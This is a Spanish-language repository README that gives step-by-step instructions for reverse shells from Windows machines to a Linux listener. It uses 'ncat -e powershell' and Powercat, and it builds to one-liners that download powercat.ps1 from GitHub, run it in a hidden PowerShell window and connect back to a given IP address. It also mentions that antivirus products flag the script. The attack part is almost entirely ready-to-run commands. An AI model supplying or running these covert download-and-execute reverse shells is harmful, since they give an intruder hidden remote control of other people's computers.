# RemotePowerShells
Repositorio sobre shell remotas.

# Shell Remota entre Linux y Windows con Ncat

Este documento proporciona una guía paso a paso para establecer una shell remota entre una máquina Linux y una máquina Windows utilizando Netcat en Linux y Ncat en Windows, con la ventana de PowerShell en la máquina Windows.

## En la máquina Linux (Listener)

1. Abre una terminal.
2. Ejecuta el siguiente comando para iniciar un listener con Netcat:
   ```
   nc -lvp 4444
   ```
   Donde `4444` es el puerto en el que deseas escuchar.

## En la máquina Windows (Conector)

1. Abre cmd.exe.
2. Inicia una shell remota con la ventana de PowerShell con el siguiente comando:
   ```
   ncat -e powershell <ip-address> 4444
   ```
   Donde `<ip-address>` es la dirección IP de tu máquina Linux y `4444` es el puerto que especificaste en el comando Netcat.

Ahora, cuando te conectes desde tu máquina Linux, obtendrás una shell de PowerShell de tu máquina Windows.



# Shell Remota entre Linux y Windows con Powercat

Guía paso a paso para establecer una shell remota entre una máquina Linux y una máquina Windows utilizando Netcat y Powercat.
**IMPORTANTE:** muchos antivirus, como Windows Defender, identifican el archivo `powercat.ps1` como código malicioso una vez descargado, bloqueándolo y eliminándolo.

## En la máquina Linux (Listener)

1. Abre una terminal.
2. Ejecuta el siguiente comando para iniciar un listener con Netcat:
   ```
   nc -lvp 4444
   ```
   Donde `4444` es el puerto en el que deseas escuchar.

## En la máquina Windows (Conector)

1. Abre PowerShell.
2. Descarga e importa el módulo Powercat con los siguientes comandos:
   ```
   Invoke-WebRequest "https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1" -OutFile powercat.ps1
   Import-Module ./powercat.ps1
   ```
3. Conecta tu máquina Windows a la máquina Linux con el siguiente comando:
   ```
   powercat -c <ip-address> -p 4444 -ep powershell
   ```
   Donde `<ip-address>` es la dirección IP de tu máquina Linux y `4444` es el puerto que especificaste en el comando Netcat.

Ahora, cuando te conectes desde tu máquina Linux, obtendrás una shell de PowerShell de tu máquina Windows.

### Inicia una shell remota con la ventana de PowerShell oculta con el siguiente comando:
   ```
   Start-Process powershell -ArgumentList "-WindowStyle Hidden -Command & {powercat -c <ip-address> -p 4444 -ep powershell}" 
   ```
### Unificar descarga de Powercat, inicio de una shell remota con la ventana de PowerShell oculta con el siguiente comando:
   ```
   Start-Process powershell -ArgumentList "-WindowStyle Hidden -Command & {Invoke-WebRequest 'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1' -OutFile powercat.ps1; Import-Module ./powercat.ps1; powercat -c <ip-address> -p 4444 -ep powershell}" 
   ```
Este comando realiza las siguientes acciones:

1. Inicia un nuevo proceso de PowerShell con la ventana oculta.
2. Descarga el módulo Powercat e importa el módulo.
3. Establece la shell remota.

### Iniciar la shell desde cmd.exe

Aquí tienes el comando unificado que descarga Powercat, inicia una shell remota y oculta la ventana de PowerShell, todo en una sola línea desde un cmd.exe:
```
powershell -Command "& {Start-Process powershell -ArgumentList '-WindowStyle Hidden -Command & {Invoke-WebRequest ''https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'' -OutFile powercat.ps1; Import-Module ./powercat.ps1; powercat -c <ip-address> -p 4444 -ep powershell}'}"
```
